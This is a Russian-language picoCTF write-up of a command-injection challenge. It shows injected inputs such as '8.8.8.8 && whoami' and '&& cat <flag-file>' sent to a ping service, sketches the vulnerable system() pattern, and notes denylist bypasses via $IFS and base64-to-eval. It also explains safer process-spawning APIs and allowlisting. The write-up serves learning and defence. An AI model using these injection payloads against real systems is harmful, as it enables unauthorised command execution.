---
task: ping-cmd
category: General Skills
difficulty: Easy
platform: picoctf
event: picoCTF 2026
date: 2026-04-30
solved: true
---

# ping-cmd

## Условие

Сервер на `nc mysterious-sea.picoctf.net 55279` запрашивает IP-адрес для пинга.
В подсказке: *"We have tight security because we only allow '8.8.8.8'"* и *"what happens if you get a little creative with your input?"*

Намёки в самом описании: "reveal its secrets" + "creative input" + название **ping-cmd** = указание на инъекцию команды.

## Подход

1. Подключился через `nc`, увидел prompt.
2. Первая попытка — пробел как разделитель: `8.8.8.8 whoami`. Не сработало — соединение закрылось без вывода. Понял что **пробел это argument separator для `ping`, а не command separator для shell**: сервер выполнил `ping 8.8.8.8 whoami`, ping молча проигнорировал лишний аргумент.
3. Переключился на shell metacharacter `&&`. Сработало.

## Решение

```
nc mysterious-sea.picoctf.net 55279
> 8.8.8.8 && whoami
PING 8.8.8.8 ... (вывод ping)
ctf-player                            # ← вторая команда выполнилась

> 8.8.8.8 && ls -la
PING 8.8.8.8 ...
... <в листинге увидел файл с флагом>

> 8.8.8.8 && ls -la && cat <flag-file>
PING 8.8.8.8 ...
... <listing>
picoCTF{...}
```

## Что узнал нового

### 1. Class: **command injection** (OWASP Top 10 — Injection)

Сервер скорее всего делал что-то вроде:
```c
char cmd[256];
snprintf(cmd, sizeof(cmd), "ping -c 2 %s", user_input);
system(cmd);   // ← shell парсит всю строку, включая metacharacters
```
или эквивалент в Python (`os.system(f"ping {ip}")`), Go (`exec.Command("sh", "-c", ...)`), JS (`child_process.exec`).
Когда `user_input` содержит `;`, `&&`, `||`, `|`, `` ` ``, `$(...)` — shell **разделяет это на несколько команд**, и атакующий выполняет произвольный код.

Проверка `== "8.8.8.8"` НЕ срабатывает потому что её просто нет — сервер проверяет только что строка **начинается** с IP, или вообще не проверяет (только формирует prompt).

### 2. Разница `space` vs shell metacharacter

- **Пробел** — argument separator для ОДНОЙ команды. `cmd a b c` = одна команда `cmd` с аргументами `a b c`.
- **`;` / `&&` / `||` / `|`** — command separator. Делят строку на **несколько команд** в глазах shell.

### 3. Семантика операторов

| Оператор | Когда выполнится правая команда |
|----------|--------------------------------|
| `cmd1 ; cmd2` | Всегда |
| `cmd1 && cmd2` | Только если cmd1 вернула exit code 0 |
| `cmd1 \|\| cmd2` | Только если cmd1 вернула non-zero |
| `cmd1 \| cmd2` | Параллельно — stdout cmd1 → stdin cmd2 |

### 4. Почему это важно для builder'а СЗИ

В коде агента/сканера/драйвера — **никогда не использовать `system(user_input)` или `popen("sh -c ...")` с пользовательским вводом**. Правильный путь:
- `execve(path, argv[], envp[])` — НЕ парсит shell, аргументы передаются массивом.
- `posix_spawn()` — то же самое.
- В Python: `subprocess.run([list], shell=False)` (НЕ `shell=True`).

Если очень нужно строить команду — **allowlist** (белый список разрешённых токенов), не denylist (потому что обойти можно через `$IFS`, `\n`, base64 → eval, и т.д.).

## Ключевые термины (English)

- **command injection** — внедрение команды через необезопашенный ввод в shell
- **shell metacharacter** — спецсимвол shell: `; & | < > * ? [ ] $ ( ) \` ' " \\`
- **argument separator** vs **command separator** — пробел vs `;`/`&&`/`|`
- **exit code** / **return code** — целочисленное значение возврата процесса (0 = success); используется операторами `&&` / `||`
- **pipe** (`|`) — однонаправленный канал между stdout одного процесса и stdin другого
- **sequencer** (`;`, `&&`, `||`) — последовательное выполнение команд
- **allowlist** / **denylist** (бывшие whitelist / blacklist) — стратегии валидации ввода
- **input sanitization** — обработка ввода для удаления опасных конструкций
- **`system(3)`**, **`popen(3)`**, **`execve(2)`** — функции запуска процессов в C
- **OWASP Top 10** — стандартный список топ-10 уязвимостей веб-приложений (Injection — A03:2021)

## Связанные темы

- [[topics/security/command-injection]] — концепция (создаётся этим writeup'ом)
- [[topics/linux/pipes]] — концепция pipe (task-06)
- [[topics/linux/fork-exec-wait]] — почему `execve` безопаснее `system` (task-04)
